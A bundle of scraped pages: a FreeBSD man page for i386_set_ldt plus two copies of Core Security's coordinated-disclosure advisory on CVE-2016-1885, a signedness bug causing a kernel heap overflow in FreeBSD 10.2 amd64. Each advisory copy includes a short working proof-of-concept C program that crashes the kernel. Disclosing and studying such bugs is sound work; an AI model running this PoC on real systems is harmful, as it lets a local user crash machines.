OpenBSD 5.5
OpenBSD 5.4
OpenBSD 5.3
OpenBSD 5.2
OpenBSD 5.1
OpenBSD 5.0
OpenBSD 4.9
OpenBSD 4.8
OpenBSD 4.7
OpenBSD 4.6
OpenBSD 4.5
OpenBSD 4.4
OpenBSD 4.3
OpenBSD 4.2
OpenBSD 4.1
OpenBSD 4.0
OpenBSD 3.9
OpenBSD 3.8
OpenBSD 3.7
OpenBSD 3.6
OpenBSD 3.5
OpenBSD 3.4
OpenBSD 3.3
OpenBSD 3.2
OpenBSD 3.1
OpenBSD 3.0
OpenBSD 2.9
OpenBSD 2.8
OpenBSD 2.7
OpenBSD 2.6
OpenBSD 2.5
OpenBSD 2.4
OpenBSD 2.3
OpenBSD 2.2
OpenBSD 2.1
OpenBSD 2.0
OpenDarwin 7.2.1
OpenDarwin 6.6.2/x86
OpenDarwin 6.6.1/x86
OpenDarwin 20030208pre4/ppc
OpenStep 4.2
openSUSE 42.3
openSUSE 42.2
openSUSE 42.1
openSUSE 15.6
openSUSE 15.5
openSUSE 15.4
openSUSE 15.3
openSUSE 15.2
openSUSE 15.1
openSUSE 15.0
openSUSE 13.2
openSUSE 13.1
openSUSE 11.4
openSUSE 11.3
openSUSE 11.2
openSUSE 10.3
openSUSE 10.2
OSF1 V5.1/alpha
OSF1 V4.0/alpha
OSF1 V1.0/mips
Plan 9
Red Hat 9.0
Red Hat 8.0
Red Hat 7.3
Red Hat 7.2
Red Hat 7.1
Red Hat 7.0
Red Hat 6.2
Red Hat 6.1
Red Hat 5.2
Red Hat 5.0
Red Hat 4.2
Rhapsody DR1
Rhapsody DR2
Rocky 9.5
Rocky 9.4
Rocky 9.3
Rocky 9.2
Rocky 9.1
Rocky 9.0
Rocky 8.10
Rocky 8.9
Rocky 8.8
Rocky 8.7
Rocky 8.6
Rocky 8.5
Rocky 8.4
Rocky 8.3
Sun UNIX 0.4
SunOS 5.10
SunOS 5.9
SunOS 5.8
SunOS 5.7
SunOS 5.6
SunOS 5.5.1
SunOS 4.1.3
SuSE 11.3
SuSE 11.2
SuSE 11.1
SuSE 11.0
SuSE 10.3
SuSE 10.2
SuSE 10.1
SuSE 10.0
SuSE 9.3
SuSE 9.2
SuSE 8.2
SuSE 8.1
SuSE 8.0
SuSE 7.3
SuSE 7.2
SuSE 7.1
SuSE 7.0
SuSE 6.4
SuSE 6.3
SuSE 6.1
SuSE 6.0
SuSE 5.3
SuSE 5.2
SuSE 5.0
SuSE 4.3
SuSE ES 10 SP1
Ubuntu 24.04 noble
Ubuntu 23.10 mantic
Ubuntu 22.04 jammy
Ubuntu 20.04 focal
Ubuntu 18.04 bionic
Ubuntu 16.04 xenial
Ubuntu 14.04 trusty
ULTRIX 4.2
Ultrix-32 2.0/VAX
Unix Seventh Edition
X11R7.4
X11R7.3.2
X11R7.2
X11R6.9.0
X11R6.8.2
X11R6.7.0
XFree86 4.8.0
XFree86 4.7.0
XFree86 4.6.0
XFree86 4.5.0
XFree86 4.4.0
XFree86 4.3.0
XFree86 4.2.99.3
XFree86 4.2.0
XFree86 4.1.0
XFree86 4.0.2
XFree86 4.0.1
XFree86 4.0
XFree86 3.3.6
XFree86 3.3
XFree86 2.1

All Architectures
amd64
arm
i386
powerpc
sparc64

html
pdf
ascii

[home](/cgi/man.cgi) |
[help](/cgi/man.cgi/help.html)

---

```

I386_GET_LDT(2)		      System Calls Manual	       I386_GET_LDT(2)

[NAME](#end)
       i386_get_ldt,  i386_set_ldt -- manage i386 per-process Local Descriptor
       Table entries

[LIBRARY](#end)
       Standard	C Library (libc, -lc)

[SYNOPSIS](#end)
       #include	<machine/segments.h>
       #include	<machine/sysarch.h>

       int
       i386_get_ldt(int	start_sel, union descriptor *descs, int	num_sels);

       int
       i386_set_ldt(int	start_sel, union descriptor *descs, int	num_sels);

[DESCRIPTION](#end)
       The i386_get_ldt() system call returns a	list of	the  i386  descriptors
       in  the	current	 process'  LDT.	 The i386_set_ldt() system call	sets a
       list of i386 descriptors	in the current process'	LDT.   For  both  rou-
       tines,  start_sel  specifies  the  index	 of the	selector in the	LDT at
       which to	begin and descs	points to an array of num_sels descriptors  to
       be set or returned.

       Each  entry  in	the  descs array can be	either a segment_descriptor or
       gate_descriptor and are defined in <i386/segments.h>.  These structures
       are defined by the architecture as disjoint bit-fields, so care must be
       taken in	constructing them.

       If start_sel is	LDT_AUTO_ALLOC,	 num_sels  is  1  and  the  descriptor
       pointed	to  by descs is	legal, then i386_set_ldt() will	allocate a de-
       scriptor	and return its selector	number.

       If num_descs is 1,  start_sels  is  valid,  and	descs  is  NULL,  then
       i386_set_ldt() will free	that descriptor	(making	it available to	be re-
       allocated again later).

       If num_descs is 0, start_sels is	0 and descs is NULL then, as a special
       case, i386_set_ldt() will free all descriptors.

[RETURN VALUES](#end)
       Upon  successful	 completion,  i386_get_ldt() returns the number	of de-
       scriptors currently in the LDT.	The i386_set_ldt() system call returns
       the first selector set on success.  If the kernel allocated a  descrip-
       tor in the LDT, the allocated index is returned.	 Otherwise, a value of
       -1 is returned and the global variable errno is set to indicate the er-
       ror.

[ERRORS](#end)
       The i386_get_ldt() and i386_set_ldt() system calls will fail if:

       [EINVAL]		  An  inappropriate  value  was	 used for start_sel or
			  num_sels.

       [EACCES]		  The caller attempted to use a	descriptor that	 would
			  circumvent protection	or cause a failure.

[SEE ALSO](#end)
       i386 Microprocessor Programmer's	Reference Manual, Intel

[WARNING](#end)
       You can really hose your	process	using this.

GNU			       October 14, 2006		       I386_GET_LDT(2)

```

---

[NAME](#NAME) |
[LIBRARY](#LIBRARY) |
[SYNOPSIS](#SYNOPSIS) |
[DESCRIPTION](#DESCRIPTION) |
[RETURN VALUES](#RETURN_VALUES) |
[ERRORS](#ERRORS) |
[SEE ALSO](#SEE_ALSO) |
[WARNING](#WARNING)

Want to link to this manual page? Use this URL:
<<https://man.freebsd.org/cgi/man.cgi?query=i386_set_ldt&sektion=2&manpath=FreeBSD+8.2-RELEASE>>

[home](/cgi/man.cgi)
| [help](/cgi/man.cgi/help.html)

---

[Legal Notices](https://www.FreeBSD.org/copyright/) | © 1995-2025
The FreeBSD Project. All rights reserved.

[Contact](https://www.FreeBSD.org/mailto/)



=== Content from packetstormsecurity.com_2b4f6ef8_20250125_053243.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from seclists.org_e4838921_20250125_053245.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](55)
[By Date](date.html#56)
[![Next](/images/right-icon-16x16.png)](57)

[![Previous](/images/left-icon-16x16.png)](55)
[By Thread](index.html#56)
[![Next](/images/right-icon-16x16.png)](67)

![](/shared/images/nst-icons.svg#search)

# [CORE-2016-0005] - FreeBSD Kernel amd64\_set\_ldt Heap Overflow

---

*From*: CORE Advisories Team <advisories () coresecurity com>

*Date*: Wed, 16 Mar 2016 14:30:29 -0300

---

```
1. Advisory Information

Title: FreeBSD Kernel amd64_set_ldt Heap Overflow
Advisory ID: CORE-2016-0005
Advisory URL: <http://www.coresecurity.com/content/freebsd-kernel-amd64_set_ldt-heap-overflow>
Date published: 2016-03-16
Date of last update: 2016-03-14
Vendors contacted: FreeBSD
Release mode: Coordinated release

2. Vulnerability Information

Class: Unsigned to Signed Conversion Error [CWE-196]
Impact: Denial of service
Remotely Exploitable: No
Locally Exploitable: Yes
CVE Name: CVE-2016-1885

3. Vulnerability Description

FreeBSD is an advanced computer operating system used to power modern servers, desktops and embedded platforms. A large
community has continually developed it for more than thirty years. Its advanced networking, security and storage
features have made FreeBSD the platform of choice for many of the busiest web sites and most pervasive embedded
networking and storage devices.

An integer signedness error has been found in the amd64_set_ldt() function in the FreeBSD kernel code (defined in the
/sys/amd64/amd64/sys_machdep.c file), which implements the i386_set_ldt system call on the amd64 version of the OS.
This integer signedness issue ultimately leads to a heap overflow in the kernel, allowing local unprivileged attackers
to crash the system.

4. Vulnerable packages

FreeBSD 10.2 amd64.
Other amd64 versions may be affected too but they were no checked.
5. Non-vulnerable packages

FreeBSD 10.2-RELENG.
6. Vendor Information, Solutions and Workarounds

The FreeBSD team has released patches for the reported vulnerabilities. You should upgrade to FreeBSD 10.2-RELENG.

7. Credits

This vulnerability was discovered and researched by Francisco Falcon from Core Exploit Writers Team. The publication of
this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.

8. Technical Description / Proof of Concept Code

8.1. FreeBSD amd64_set_ldt Integer Signedness Vulnerability

[CVE-2016-1885] FreeBSD exposes the i386_set_ldt[1] architecture-dependent system call for its Intel i386 version. This
system call can be used to manage i386 per-process Local Descriptor Table (LDT) entries. The amd64 version of FreeBSD
still exposes this system call for 32-bit applications running on the 64-bit version of the OS.

Architecture-specific system calls are handled by the FreeBSD kernel in the sysarch() function, which is defined in the
/sys/amd64/amd64/sys_machdep.c[2] file:

int
sysarch(td, uap)
    struct thread *td;
    register struct sysarch_args *uap;
{
[...]
if (uap->op == I386_GET_LDT || uap->op == I386_SET_LDT)
    return (sysarch_ldt(td, uap, UIO_USERSPACE));
[...]

As we can see in the code snippet above, if the system call being invoked is either I386_GET_LDT or I386_SET_LDT, then
the sysarch_ldt() function is called. The following code excerpt shows the part of the sysarch_ldt() function that is
in charge of handling the I386_SET_LDT syscall:

int
sysarch_ldt(struct thread *td, struct sysarch_args *uap, int uap_space)
{
struct i386_ldt_args *largs, la;
struct user_segment_descriptor *lp;
[...]
switch (uap->op) {
    [...]
    case I386_SET_LDT:
            if (largs->descs != NULL && largs->num > max_ldt_segment)
                return (EINVAL);
            set_pcb_flags(td->td_pcb, PCB_FULL_IRET);
            if (largs->descs != NULL) {
                lp = malloc(largs->num * sizeof(struct
                    user_segment_descriptor), M_TEMP, M_WAITOK);
                error = copyin(largs->descs, lp, largs->num *
                    sizeof(struct user_segment_descriptor));
                if (error == 0)
                    error = amd64_set_ldt(td, largs, lp);
                free(lp, M_TEMP);
            } else {
                error = amd64_set_ldt(td, largs, NULL);
            }
            break;

The largs variable that can be seen there is a pointer to an i386_ldt_args structure, which is defined as follows in
the /sys/x86/include/sysarch.h[3] file:

struct i386_ldt_args {
    unsigned int start;
    union descriptor *descs;
    unsigned int num;
};

Note that all of the fields of the i386_ldt_args structure are fully user-controlled: they match the 3 arguments
specified by the user when i386_set_ldt() was called from user mode:

int i386_set_ldt(int start_sel, union descriptor *descs, int num_sels);

```
> ```
> From the sysarch_ldt() snippet above we can see that if we call i386_set_ldt() from user mode specifying a NULL
> pointer as the second argument (largs->descs), then it will end up calling the amd64_set_ldt() function, passing the
> largs variable as the second argument, and a NULL pointer as the third argument. This is the prototype of the
> amd64_set_ldt() function being called:
>
> ```

```

int
amd64_set_ldt(struct thread *td, struct i386_ldt_args *uap, struct user_segment_descriptor *descs);

amd64_set_ldt() is the vulnerable function here. Since it is being called with its third argument (the descs pointer)
set to NULL, the following code path will be executed (remember that every field in the i386_ldt_args structure pointed
by the uap pointer is fully controlled from user mode):

    int
    amd64_set_ldt(td, uap, descs)
        struct thread *td;
        struct i386_ldt_args *uap;
        struct user_segment_descriptor *descs;
    {
    [...]
        int largest_ld;
    [...]
608        if (descs == NULL) {
609                /* Free descriptors */
610                if (uap->start == 0 && uap->num == 0)
611                        uap->num = max_ldt_segment;
612                if (uap->num == 0)
613                        return (EINVAL);
614                if ((pldt = mdp->md_ldt) == NULL ||
615                    uap->start >= max_ldt_segment)
616                        return (0);
617                largest_ld = uap->start + uap->num;
618                if (largest_ld > max_ldt_segment)
619                        largest_ld = max_ldt_segment;
620                i = largest_ld - uap->start;
621                mtx_lock(&dt_lock);
622                bzero(&((struct user_segment_descriptor *)(pldt->ldt_base))
623                    [uap->start], sizeof(struct user_segment_descriptor) * i);
624                mtx_unlock(&dt_lock);
625                return (0);
626        }

The two if statements at lines 610 and 612 perform some sanity checks against uap->start and uap->num, which can be
avoided by setting uap->num to a value different than 0. The next check at lines 614/615 will cause the function to
exit early if the mdp->md_ldt pointer is NULL, or if uap->start is greater or equal than max_ldt_segment (1024). Having
mdp->md_ldt holding a non-NULL value can be achieved by adding an initial entry to the process LDT before triggering
the bug, like this:

    struct segment_descriptor desc = {0, 0, SDT_MEMRW, SEL_UPL, 1, 0, 0, 1, 0 ,0};
    i386_set_ldt(LDT_AUTO_ALLOC, (union descriptor *) &desc, 1);

After passing those checks we reach the vulnerable code at lines 617-619:

617                largest_ld = uap->start + uap->num;
618                if (largest_ld > max_ldt_segment)
619                        largest_ld = max_ldt_segment;
620                i = largest_ld - uap->start;

Note that largest_ld is a signed int that will hold the sum of uap->start + uap->num. The code at lines 618-619 tries
to ensure that largest_ld is not greater than max_ldt_segment (1024); however, being largest_ld a signed integer
holding a value fully controlled from user mode, it will perform a signed comparison that can be bypassed by setting
uap->num to a negative number.

This signedness error will ultimately lead to a heap overflow in the FreeBSD kernel when the bzero() function is later
called with a huge value as its len parameter:

622                bzero(&((struct user_segment_descriptor *)(pldt->ldt_base))
623                    [uap->start], sizeof(struct user_segment_descriptor) * i);

8.2. Proof of Concept

The following Proof-of-Concept code reproduces the vulnerability in a default FreeBSD 10.2-RELEASE-amd64 installation
running a GENERIC kernel:

/* $ clang amd64_set_ldt.c -o amd64_set_ldt -m32 */

#include <stdio.h>
#include <unistd.h>
#include <machine/segments.h>
#include <machine/sysarch.h>
#include <sysexits.h>
#include <err.h>

int main(int argc, char **argv){

    int res;

    struct segment_descriptor desc = {0, 0, SDT_MEMRW, SEL_UPL, 1, 0, 0, 1, 0 ,0};

    printf("[+] Adding an initial entry to the process LDT...\n");
    res = i386_set_ldt(LDT_AUTO_ALLOC, (union descriptor *) &desc, 1);
    if (res < 0){
        err(EX_OSERR, "i386_set_ldt(LDT_AUTO_ALLOC)");
    }
    printf("returned index: %d\n", res);

    printf("Triggering the bug...\n");
    res = i386_set_ldt(1, NULL, 0x80000000);
}

9. Report Timeline

2016-03-02: Core Security sent an initial notification to FreeBSD.
2016-03-02: FreeBSD confirmed reception of our email and requested we sent them a draft version of the advisory.
2016-03-02: Core Security sent FreeBSD a draft version of the advisory. We requested them to let us know once they
finished reviewing the advisory in order to coordinate a publication date.
2016-03-11: Core Security asked FreeBSD if they were able to review and verify the reported issue. We additionally
requested an estimated date for releasing the fix/update.
2016-03-11: FreeBSD informed us they were going to release the update in the middle of the following week.
2016-03-11: Core Security asked FreeBSD if they had the specific date and time they were going to release the update.
We additionally requested a CVE identifier for the vulnerability considering they are registered as a CNA.
2016-03-11: FreeBSD informed us they would probably release it on Wednesday 16th of March and that they assigned the
CVE-2016-1885 ID.
2016-03-16: Advisory CORE-2016-0005 published.
10. References

[1] <https://www.freebsd.org/cgi/man.cgi?query=i386_set_ldt&sektion=2&manpath=FreeBSD+8.2-RELEASE>
[2] <https://svnweb.freebsd.org/base/release/10.2.0/sys/amd64/amd64/sys_machdep.c?view=markup>
[3] <https://svnweb.freebsd.org/base/release/10.2.0/sys/x86/include/sysarch.h?view=markup>

11. About CoreLabs

CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for
information security technologies. We conduct our research in several important areas of computer security including
system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results
include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies.
CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for
public use at: <http://corelabs.coresecurity.com>.

12. About Core Security Technologies

Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions
that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain
real visibility into their security standing, real validation of their security controls, and real metrics to more
effectively secure their organizations.

Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from
the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached
at +1 (617) 399-6980 or on the Web at: <http://www.coresecurity.com>.

13. Disclaimer

The contents of this advisory are copyright (c) 2014 Core Security and (c) 2014 CoreLabs, and are licensed under a
Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License:
<http://creativecommons.org/licenses/by-nc-sa/3.0/us/>

14. PGP/GPG Keys

This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at
<http://www.coresecurity.com/files/attachments/core_security_advisories.asc>.

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](55)
[By Date](date.html#56)
[![Next](/images/right-icon-16x16.png)](57)

[![Previous](/images/left-icon-16x16.png)](55)
[By Thread](index.html#56)
[![Next](/images/right-icon-16x16.png)](67)

### Current thread:

* **[CORE-2016-0005] - FreeBSD Kernel amd64\_set\_ldt Heap Overflow** *CORE Advisories Team (Mar 16)*
  + [Re: [CORE-2016-0005] - FreeBSD Kernel amd64\_set\_ldt Heap Overflow](67) *jungle Boogie (Mar 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.exploit-db.com_36dba456_20250125_053248.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# FreeBSD 10.2 (x64) - 'amd64\_set\_ldt' Heap Overflow

#### EDB-ID:

###### 39570

#### CVE:

###### [2016-1885](https://nvd.nist.gov/vuln/detail/CVE-2016-1885)

---

**EDB Verified:**

#### Author:

###### [Core Security](/?author=832)

#### Type:

###### [dos](/?type=dos)

---

#### Platform:

###### [FreeBSD\_x86-64](/?platform=freebsd_x86-64)

#### Date:

###### 2016-03-16

---

**Vulnerable App:**

```
/*

1. Advisory Information

Title: FreeBSD Kernel amd64_set_ldt Heap Overflow
Advisory ID: CORE-2016-0005
Advisory URL: http://www.coresecurity.com/content/freebsd-kernel-amd64_set_ldt-heap-overflow
Date published: 2016-03-16
Date of last update: 2016-03-14
Vendors contacted: FreeBSD
Release mode: Coordinated release

2. Vulnerability Information

Class: Unsigned to Signed Conversion Error [CWE-196]
Impact: Denial of service
Remotely Exploitable: No
Locally Exploitable: Yes
CVE Name: CVE-2016-1885

3. Vulnerability Description

FreeBSD is an advanced computer operating system used to power modern servers, desktops and embedded platforms. A large community has continually developed it for more than thirty years. Its advanced networking, security and storage features have made FreeBSD the platform of choice for many of the busiest web sites and most pervasive embedded networking and storage devices.

An integer signedness error has been found in the amd64_set_ldt() function in the FreeBSD kernel code (defined in the /sys/amd64/amd64/sys_machdep.c file), which implements the i386_set_ldt system call on the amd64 version of the OS. This integer signedness issue ultimately leads to a heap overflow in the kernel, allowing local unprivileged attackers to crash the system.

4. Vulnerable packages

FreeBSD 10.2 amd64.
Other amd64 versions may be affected too but they were no checked.
5. Non-vulnerable packages

FreeBSD 10.2-RELENG.
6. Vendor Information, Solutions and Workarounds

The FreeBSD team has released patches for the reported vulnerabilities. You should upgrade to FreeBSD 10.2-RELENG.

7. Credits

This vulnerability was discovered and researched by Francisco Falcon from Core Exploit Writers Team. The publication of this advisory was coordinated by Joaquin Rodriguez Varela from Core Advisories Team.

8. Technical Description / Proof of Concept Code

8.1. FreeBSD amd64_set_ldt Integer Signedness Vulnerability

[CVE-2016-1885] FreeBSD exposes the i386_set_ldt[1] architecture-dependent system call for its Intel i386 version. This system call can be used to manage i386 per-process Local Descriptor Table (LDT) entries. The amd64 version of FreeBSD still exposes this system call for 32-bit applications running on the 64-bit version of the OS.

Architecture-specific system calls are handled by the FreeBSD kernel in the sysarch() function, which is defined in the /sys/amd64/amd64/sys_machdep.c[2] file:

int
sysarch(td, uap)
    struct thread *td;
    register struct sysarch_args *uap;
{
[...]
if (uap->op == I386_GET_LDT || uap->op == I386_SET_LDT)
    return (sysarch_ldt(td, uap, UIO_USERSPACE));
[...]

As we can see in the code snippet above, if the system call being invoked is either I386_GET_LDT or I386_SET_LDT, then the sysarch_ldt() function is called. The following code excerpt shows the part of the sysarch_ldt() function that is in charge of handling the I386_SET_LDT syscall:

int
sysarch_ldt(struct thread *td, struct sysarch_args *uap, int uap_space)
{
struct i386_ldt_args *largs, la;
struct user_segment_descriptor *lp;
[...]
switch (uap->op) {
    [...]
    case I386_SET_LDT:
            if (largs->descs != NULL && largs->num > max_ldt_segment)
                return (EINVAL);
            set_pcb_flags(td->td_pcb, PCB_FULL_IRET);
            if (largs->descs != NULL) {
                lp = malloc(largs->num * sizeof(struct
                    user_segment_descriptor), M_TEMP, M_WAITOK);
                error = copyin(largs->descs, lp, largs->num *
                    sizeof(struct user_segment_descriptor));
                if (error == 0)
                    error = amd64_set_ldt(td, largs, lp);
                free(lp, M_TEMP);
            } else {
                error = amd64_set_ldt(td, largs, NULL);
            }
            break;

The largs variable that can be seen there is a pointer to an i386_ldt_args structure, which is defined as follows in the /sys/x86/include/sysarch.h[3] file:

struct i386_ldt_args {
    unsigned int start;
    union descriptor *descs;
    unsigned int num;
};

Note that all of the fields of the i386_ldt_args structure are fully user-controlled: they match the 3 arguments specified by the user when i386_set_ldt() was called from user mode:

int i386_set_ldt(int start_sel, union descriptor *descs, int num_sels);

From the sysarch_ldt() snippet above we can see that if we call i386_set_ldt() from user mode specifying a NULL pointer as the second argument (largs->descs), then it will end up calling the amd64_set_ldt() function, passing the largs variable as the second argument, and a NULL pointer as the third argument. This is the prototype of the amd64_set_ldt() function being called:

int
amd64_set_ldt(struct thread *td, struct i386_ldt_args *uap, struct user_segment_descriptor *descs);

amd64_set_ldt() is the vulnerable function here. Since it is being called with its third argument (the descs pointer) set to NULL, the following code path will be executed (remember that every field in the i386_ldt_args structure pointed by the uap pointer is fully controlled from user mode):

    int
    amd64_set_ldt(td, uap, descs)
        struct thread *td;
        struct i386_ldt_args *uap;
        struct user_segment_descriptor *descs;
    {
    [...]
        int largest_ld;
    [...]
608        if (descs == NULL) {
609                 Free descriptors
610                if (uap->start == 0 && uap->num == 0)
611                        uap->num = max_ldt_segment;
612                if (uap->num == 0)
613                        return (EINVAL);
614                if ((pldt = mdp->md_ldt) == NULL ||
615                    uap->start >= max_ldt_segment)
616                        return (0);
617                largest_ld = uap->start + uap->num;
618                if (largest_ld > max_ldt_segment)
619                        largest_ld = max_ldt_segment;
620                i = largest_ld - uap->start;
621                mtx_lock(&dt_lock);
622                bzero(&((struct user_segment_descriptor *)(pldt->ldt_base))
623                    [uap->start], sizeof(struct user_segment_descriptor) * i);
624                mtx_unlock(&dt_lock);
625                return (0);
626        }

The two if statements at lines 610 and 612 perform some sanity checks against uap->start and uap->num, which can be avoided by setting uap->num to a value different than 0. The next check at lines 614/615 will cause the function to exit early if the mdp->md_ldt pointer is NULL, or if uap->start is greater or equal than max_ldt_segment (1024). Having mdp->md_ldt holding a non-NULL value can be achieved by adding an initial entry to the process LDT before triggering the bug, like this:

    struct segment_descriptor desc = {0, 0, SDT_MEMRW, SEL_UPL, 1, 0, 0, 1, 0 ,0};
    i386_set_ldt(LDT_AUTO_ALLOC, (union descriptor *) &desc, 1);

After passing those checks we reach the vulnerable code at lines 617-619:

617                largest_ld = uap->start + uap->num;
618                if (largest_ld > max_ldt_segment)
619                        largest_ld = max_ldt_segment;
620                i = largest_ld - uap->start;

Note that largest_ld is a signed int that will hold the sum of uap->start + uap->num. The code at lines 618-619 tries to ensure that largest_ld is not greater than max_ldt_segment (1024); however, being largest_ld a signed integer holding a value fully controlled from user mode, it will perform a signed comparison that can be bypassed by setting uap->num to a negative number.

This signedness error will ultimately lead to a heap overflow in the FreeBSD kernel when the bzero() function is later called with a huge value as its len parameter:

622                bzero(&((struct user_segment_descriptor *)(pldt->ldt_base))
623                    [uap->start], sizeof(struct user_segment_descriptor) * i);

8.2. Proof of Concept

The following Proof-of-Concept code reproduces the vulnerability in a default FreeBSD 10.2-RELEASE-amd64 installation running a GENERIC kernel:

*/

/* $ clang amd64_set_ldt.c -o amd64_set_ldt -m32 */

#include <stdio.h>
#include <unistd.h>
#include <machine/segments.h>
#include <machine/sysarch.h>
#include <sysexits.h>
#include <err.h>

int main(int argc, char **argv){

    int res;

    struct segment_descriptor desc = {0, 0, SDT_MEMRW, SEL_UPL, 1, 0, 0, 1, 0 ,0};

    printf("[+] Adding an initial entry to the process LDT...\n");
    res = i386_set_ldt(LDT_AUTO_ALLOC, (union descriptor *) &desc, 1);
    if (res < 0){
        err(EX_OSERR, "i386_set_ldt(LDT_AUTO_ALLOC)");
    }
    printf("returned index: %d\n", res);

    printf("Triggering the bug...\n");
    res = i386_set_ldt(1, NULL, 0x80000000);
}

/*

9. Report Timeline

2016-03-02: Core Security sent an initial notification to FreeBSD.
2016-03-02: FreeBSD confirmed reception of our email and requested we sent them a draft version of the advisory.
2016-03-02: Core Security sent FreeBSD a draft version of the advisory. We requested them to let us know once they finished reviewing the advisory in order to coordinate a publication date.
2016-03-11: Core Security asked FreeBSD if they were able to review and verify the reported issue. We additionally requested an estimated date for releasing the fix/update.
2016-03-11: FreeBSD informed us they were going to release the update in the middle of the following week.
2016-03-11: Core Security asked FreeBSD if they had the specific date and time they were going to release the update. We additionally requested a CVE identifier for the vulnerability considering they are registered as a CNA.
2016-03-11: FreeBSD informed us they would probably release it on Wednesday 16th of March and that they assigned the CVE-2016-1885 ID.
2016-03-16: Advisory CORE-2016-0005 published.
10. References

[1] https://www.freebsd.org/cgi/man.cgi?query=i386_set_ldt&sektion=2&manpath=FreeBSD+8.2-RELEASE
[2] https://svnweb.freebsd.org/base/release/10.2.0/sys/amd64/amd64/sys_machdep.c?view=markup
[3] https://svnweb.freebsd.org/base/release/10.2.0/sys/x86/include/sysarch.h?view=markup

11. About CoreLabs

CoreLabs, the research center of Core Security, is charged with anticipating the future needs and requirements for information security technologies. We conduct our research in several important areas of computer security including system vulnerabilities, cyber attack planning and simulation, source code auditing, and cryptography. Our results include problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. CoreLabs regularly publishes security advisories, technical papers, project information and shared software tools for public use at: http://corelabs.coresecurity.com.

12. About Core Security Technologies

Core Security Technologies enables organizations to get ahead of threats with security test and measurement solutions that continuously identify and demonstrate real-world exposures to their most critical assets. Our customers can gain real visibility into their security standing, real validation of their security controls, and real metrics to more effectively secure their organizations.

Core Security's software solutions build on over a decade of trusted research and leading-edge threat expertise from the company's Security Consulting Services, CoreLabs and Engineering groups. Core Security Technologies can be reached at +1 (617) 399-6980 or on the Web at: http://www.coresecurity.com.

13. Disclaimer

The contents of this advisory are copyright (c) 2014 Core Security and (c) 2014 CoreLabs, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/

14. PGP/GPG Keys

This advisory has been signed with the GPG key of Core Security advisories team, which is available for download at http://www.coresecurity.com/files/attachments/core_security_advisories.asc.

*/

```

**Tags:**

**Advisory/Source:**
[Link](http://www.coresecurity.com/content/freebsd-kernel-amd64_set_ldt-heap-overflow)

| **Databases** | **Links** | **Sites** | **Solutions** |
